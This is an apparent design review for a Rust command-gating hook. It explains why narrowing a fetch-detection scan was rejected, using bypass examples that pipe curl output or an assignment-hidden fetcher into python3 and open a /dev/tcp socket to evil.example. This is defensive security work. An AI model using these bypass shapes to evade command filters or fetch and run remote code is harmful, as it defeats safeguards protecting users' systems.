# D2 — reduce the in-tree gate enumeration

**Status:** REVIEWED. **Phase 2 withdrawn as unsound.** Phase 1 conditionally
approved; Phase 3 rejected (keep the code).
**Date:** 2026-08-07
**Council:** Claude (draft) → Codex (review) → mmax (peer review)
**Refs:** #243, rtk#2286, #191, #210

---

## Outcome first

The draft proposed narrowing the whole-command fetch scan in
`all_interpreter_pipe_sinks_are_data_mode`. **Council rejected that at
blocker severity, and the rejection is correct.** The draft's central premise —
that the scan's blast radius "was never measured" — was wrong. Its *cost* was
unmeasured; its *benefit* was established across six council rounds and is
locked by `should_downgrade_keeps_fetch_hidden_behind_indirection`
(`src/hooks/tirith_gate.rs`), which encodes 14 bypass cases.

This document is retained with its errors intact, because the way the draft was
wrong is more useful than a clean document would be.

| Phase | Draft proposal | Verdict |
|---|---|---|
| 1 — `invalid_host_chars` | suppress when no URL / no network sink | **Conditional** — only with the predicate tightened (below) |
| 2 — narrow the fetch scan | 2a / 2b / 2c | **WITHDRAWN — reopens real bypasses** |
| 3 — `dotfile_overwrite` | keep / fold / delete | **Keep.** Distinct predicate, dedicated tests, no fold target |

## Why Phase 2 was wrong

`all_interpreter_pipe_sinks_are_data_mode` opens with:

```rust
if command_mentions_fetch(cmd) {
    return false;   // a fetcher ANYWHERE in the command suppresses nothing
}
```

The draft measured that this single line blocks 127 of the 174 unsuppressed
`pipe_to_interpreter` corpus entries (73%), and proposed bounding it.

**Both reviewers independently constructed working bypasses against the
proposal, and both bypasses were already regression-tested in-tree:**

- **2b** (scope the scan to the interpreter's own pipeline) is defeated by
  file-backed staging across an operator:
  `curl -so /tmp/x http://h/p && cat /tmp/x | python3 -c "…"`.
  `command_pipelines` splits at `&&`, so the interpreter's pipeline contains no
  fetcher at all. The draft's premise — that indirection requires a function or
  a variable — is false.
- **2c** (require the fetcher to be a command head) is defeated by an
  assignment-carried fetcher behind a wrapper that takes its own operands:
  `f='timeout 5 curl -s'; $f evil.example/x | python3 -c "…"`.
  The command head is `$f`. Council round 7 rejected bounded command-word
  resolution for exactly this reason.
- **2a** (ignore fetcher words inside quotes) is **largely already implemented**
  — `command_mentions_fetch` already skips quote-leading tokens. The draft's
  claim that it "addresses much of the no-URL 30" is unsupported.

### The draft's worst error

The draft presented the 30 no-URL entries as "the least defensible" false
positives. **That inverts the truth.** As mmax established, those entries are
dominated by the assignment-RHS and alias shapes — `f=curl`, `f='curl -s'`,
`alias y=curl`, `OUT=$(curl …)` — every one of which contains no `://`
precisely *because* the fetch is hidden. They are the **most** defensible
blocks in the corpus: they have no defence other than this scan.

"No URL present" is not evidence of safety. Round 8 makes that explicit:
`bash -c 'cat </dev/tcp/evil.example/4444'` opens a socket with no fetcher
binary and no URL scheme. Traced during review:
`interpreter_args_are_data_mode` classifies that body as *data-mode*, so the
whole-command scan matching `/dev/tcp/` is the only thing preventing
suppression.

### The metric was blind to it — demonstrated

The draft asserted a safety property it did not have: *"no phase may lower
`BASELINE_SUPPRESSED`"*. mmax pointed out this guard runs the wrong way for
Phase 2 — removing the backstop **raises** the suppression count while
**lowering** safety.

Confirmed empirically. Disabling `command_mentions_fetch` and re-running:

| Guard | Result |
|---|---|
| `suppression_rate_does_not_regress` | **passed** |
| `genuinely_dangerous_commands_still_downgrade` | **passed** |
| `synthetic_indirection_sentinels_still_downgrade` | **FAILED** |

The corpus-derived metric, on its own, would have waved this change through.

## Fix applied to D1's guard

mmax found a structural defect in the #243 sentinel test: it resolves each
sentinel by exact corpus membership and panics if absent, so an adversarial
shape that never occurred in real traffic **could not be added at all**. The
over-suppression guard therefore covered only shapes the operator happened to
run — none of the backstop's unique territory.

`synthetic_indirection_sentinels_still_downgrade` now asserts four
backstop-only shapes (rounds 3, 3, 7, 8) against a synthesised verdict rather
than corpus membership. Its failure above is the proof it works.

## Phase 1 — conditionally approved

25 corpus entries, no suppression branch, observed firing on commands such as
`cd /home/user/…/worktrees/agent-a85f8ea…` that contain no URL. Tirith's
hostname parser is over-eager on hyphenated path segments.

**Required conditions, per council:**

1. The "no network sink" predicate must be **literally `!command_mentions_fetch(cmd)`**,
   not a hand-rolled curl/wget token check. A fresh enumeration here would
   repeat the `/dev/tcp` omission that round 8 already paid for — the exact
   trap this whole exercise is about.
2. `/dev/tcp` and `/dev/udp` sentinels must be added to
   `MUST_DOWNGRADE_SYNTHETIC` **before** the change is written.
3. The suppression must key on URL-shape absence mirroring Tirith's own
   `extract_host`, not on a second independently-fragile predicate.

## Open question council could not close

**How many of the 127 are *also* caught per-pipeline?** Of the 14 indirection
cases, mmax's audit found 9 are uniquely backstop-only and 5 are redundant with
`stage_fetches_remote`. The 127 figure does not distinguish the two, and
narrowing a redundant detector is a different change from narrowing a unique
one. **Any future attempt at Phase 2 must produce that breakdown first.**

## What D2 actually established

The draft assumed the enumeration was accidental complexity. It is not. Each
branch of `suppresses_finding_for_command` traces to a specific bypass a
narrower formulation walked around, and the tests encoding them are load-bearing.

**The round-chains Lane D diagnosed are not evidence of bad engineering. They
are evidence of an unbounded problem being attacked with a bounded budget.**
The correct response is not to shrink the enumeration — council has now shown
that costs real security — but to keep measuring it, so its cost is visible and
each future round can be justified rather than merely imagined.

D1 supplies that measurement. D2's honest conclusion is that the enumeration
should mostly stay.

## Honest limitations (unchanged from draft, and now load-bearing)

- **The corpus contains only commands that downgraded.** It measures false
  positives and cannot, in principle, measure false negatives. The Phase 2
  demonstration above is precisely this blind spot firing.
- **The corpus is one operator's traffic**, weighted toward agent-driven
  development on a private lab network.
- **`BASELINE_SUPPRESSED` is a regression detector, not a correctness oracle.**
  For any change that touches the backstop, the synthetic sentinels are the
  real guard and the baseline is decoration.
